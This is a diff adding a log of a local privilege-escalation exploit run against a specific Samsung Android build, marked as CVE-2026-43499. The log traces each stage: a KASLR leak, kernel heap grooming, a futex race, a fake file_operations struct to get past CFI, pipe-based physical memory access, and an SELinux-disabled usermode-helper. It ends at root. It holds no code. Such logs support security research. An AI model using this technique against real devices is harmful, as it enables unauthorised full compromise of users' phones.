@@ -1,0 +1,84 @@
+[app] root helper=/data/local/tmp/cve-2026-43499-root-attempt10
+[app] loading verified payload=/data/local/tmp/a16x-attempt10.so
+[32m[+] [0mexact-build preflight ok fingerprint=samsung/a16xcs/a16x:16/BP4A.251205.006/A166WVLS8DZG1:user/release-keys
+[32m[+] [0mpreload supervisor pid=13227 attempts=1 base_delay=20000 p0_timeout=115 timeout=600
+[32m[+] [0mexploit attempt=1/1 pid=13228 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=13228 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=13228 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=13228 label=a16x-SM-A166W-DZG1-attempt10-hwcal-mcast98 stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=13228 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8000000000 bootid_data=ffffff8000000000 init_task=ffffff800231fc40 root_tg=ffffff8002505f40 sysctl_bootid=ffffff80026be0c9
+[33m[*] [0mslide source mode=tracefs
+[32m[+] [0mslide trace-marker ip=ffffffc00822a710 candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=13228 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[33m[*] [0mcontrolled mm group opened attempt=1 group=0 base=ffffff8818c00000 hint=0
+[33m[*] [0mcontrolled mm group attempt=1 group=0 base=ffffff8818c00000 slot=29 count=1 hint=0
+[33m[*] [0mcontrolled mm group attempt=8 group=0 base=ffffff8818c00000 slot=19 count=8 hint=1
+[33m[*] [0mcontrolled mm group attempt=16 group=0 base=ffffff8818c00000 slot=26 count=16 hint=1
+[33m[*] [0mcontrolled mm group opened attempt=19 group=1 base=ffffff8874d30000 hint=0
+[33m[*] [0mcontrolled mm group attempt=19 group=1 base=ffffff8874d30000 slot=17 count=1 hint=0
+[33m[*] [0mcontrolled mm group attempt=26 group=1 base=ffffff8874d30000 slot=0 count=8 hint=1
+[33m[*] [0mcontrolled mm group opened attempt=30 group=2 base=ffffff8816178000 hint=0
+[33m[*] [0mcontrolled mm group attempt=30 group=2 base=ffffff8816178000 slot=17 count=1 hint=0
+[33m[*] [0mcontrolled mm group attempt=37 group=2 base=ffffff8816178000 slot=24 count=8 hint=1
+[33m[*] [0mcontrolled mm group attempt=45 group=2 base=ffffff8816178000 slot=23 count=16 hint=1
+[33m[*] [0mcontrolled mm group attempt=53 group=2 base=ffffff8816178000 slot=3 count=24 hint=1
+[33m[*] [0mcontrolled mm group attempt=60 group=2 base=ffffff8816178000 slot=31 count=31 hint=1
+[33m[*] [0mcontrolled mm group attempt=61 group=2 base=ffffff8816178000 slot=21 count=32 hint=1
+[33m[*] [0mcontrolled mm group full group=2 base=ffffff8816178000 attempts=61 zone=normal
+[33m[*] [0mcontrolled mm group selected base=ffffff8816178000 mode=0
+[33m[*] [0mcontrolled skb shape sent bytes=36480 cpu=0
+[33m[*] [0mcontrolled mm trigger ready pages=24 refs=768 s2=870 cpu=0
+[33m[*] [0mcontrolled mm target tail armed pages=24 refs_held=745 shape=ready cpu=0
+[33m[*] [0mcontrolled mm trigger release closed=745 cpu=0
+[33m[*] [0mcontrolled skb reclaim sends=8192 pairs=32 per_pair=256 stop_errno=0 base=ffffff8816178000 mode=0
+[33m[*] [0mkernel page prepare mode=0 attempt=1/2 elapsed_ms=60308 base=ffffff8816178000
+[33m[*] [0mdurable log checkpoint stage=fops-page-held
+[33m[*] [0mp0 reference keeper pid=30295 pipe=0
+[33m[*] [0mapp fops slide route parent=ffffff8816179180 target=ffffffc00a47c250 lock=ffffff8816179390 configured_delay=50000 consume_delay=0 fine_ticks=0
+[32m[+] [0mslide child context stack_writer=mcast pid=30296 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[33m[*] [0mslide pi stage=owner-target-locked tid=30298
+[33m[*] [0mslide pi stage=owner-chain-lock-enter tid=30298
+[33m[*] [0mslide pi stage=cmp-enter waiter_tid=30297
+[33m[*] [0mslide pi stage=cmp-return ret=-1 errno=35 polls=1
+[33m[*] [0mslide pi stage=deadlock-accepted
+[33m[*] [0mslide wait_requeue_pi ret=-1 errno=110
+[33m[*] [0mslide pi stage=wait-timeout-accepted tid=30297
+[33m[*] [0mslide pi stage=waiter-unlock-enter tid=30297
+[33m[*] [0mslide pi stage=waiter-unlock-return tid=30297
+[33m[*] [0mslide pi stage=owner-chain-lock-return tid=30298
+[33m[*] [0mslide pi stage=writer-enter tid=30297
+[33m[*] [0mslide mcast returned domain=10 level=41 option=46 offset=0x98 ret=-1 errno=99 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[33m[*] [0mslide pi stage=writer-return tid=30297 sched_ok=1 window=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mapp fops stage=trigger-return attempt=1 triggered=1
+[33m[*] [0mcfi fake fops span=ffffff8816179180-ffffff8816179267 owner=0000000000000000 llseek=ffffffc00a47c250 read=0000000000000000 write=0000000000000000
+[33m[*] [0mcfi scratch span=ffffff881617a180-ffffff881617a1a2 old=zero size=35
+[33m[*] [0mcfi write ret=35 errno=0
+[33m[*] [0mcfi llseek before=ffffffc00a47c250 want=ffffffc0083ba200 slot=ffffff8816179188
+[33m[*] [0mcfi read ret=35 errno=0
+[33m[*] [0mcfi restoring misc_fops target=ffffffc00a47c250 value=ffffffc009a722d8
+[33m[*] [0mcfi starting pipe physrw
+[33m[*] [0mfresh physrw pipe after verified fops page=ffffff807af28000 attempt=1/12
+[33m[*] [0mpipe caches normal1k=ffffff8822002780 normal2k=ffffff8822002900 cgroup1k=ffffff8822002780 cgroup2k=ffffff8822002900 selected=ffffff8822002900
+[33m[*] [0mpipe page idx=0 page=ffffff807af28000 head=fffffffe01ebca00 cache08=0000000000000000 cache10=dead000000000122 cache18=ffffff8822002900 cache20=0000000000000000 type=ffffffff match=1
+[33m[*] [0mphys step pipe probe found=1 pipebuf=ffffff807af28000 idx=25 scan=1/1/1
+[33m[*] [0mphys proof spans data=ffffff881617f000-ffffff881617f016 qword=ffffff881617f100-ffffff881617f107
+[33m[*] [0mphys step probed read done ok=1 idx=25
+[33m[*] [0mphys step probed write done ok=1
+[33m[*] [0mphys step read64 done ok=1 value=306365737562656e
+[33m[*] [0mphys proof64 restore=1 old=0000000000000000 now=0000000000000000
+[33m[*] [0mphys proof restore=1 size=23
+[33m[*] [0mroot configfs-pipe start uid=2000 fd=35
+[33m[*] [0mroot umh spans work=ffffff881617e000-ffffff881617e06f data=ffffff881617e200-ffffff881617e367 selinux=ffffffc00a5e0f50 old=1
+[33m[*] [0mroot umh queued wq=ffffff882200b800 pwq=ffffff88221bf500 pool=ffffff88221c3400 work=ffffff881617e000 entry=ffffff881617e008 color=0 counters=0/0/2 writes=1/1/1/1/1/1/1
+[33m[*] [0mroot umh result wake=1 complete=1 retval=0 socket=1
+[33m[*] [0mroot umh scratch restore work=1/1 data=1/1
+[33m[*] [0mroot umh selinux left=0 intended root state old=1
+[33m[*] [0mroot reference holder not required by target route
+[33m[*] [0mapp fops slide attempt=1/1 triggered=1 verified=1 step=0 errno=0
+[32m[+] [0mpipe-physrw-summary pid=13228 done=1 root=1 kaslr=1 base=ffffffc008008000 slide=0000000000008000
+[32m[+] [0mpipe physrw pid=13228 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[32m[+] [0mstability keeper pid=2602 retaining reclaimed kernel pages
+[32m[+] [0mexploit completed attempt=1/1
+[app] payload constructor returned
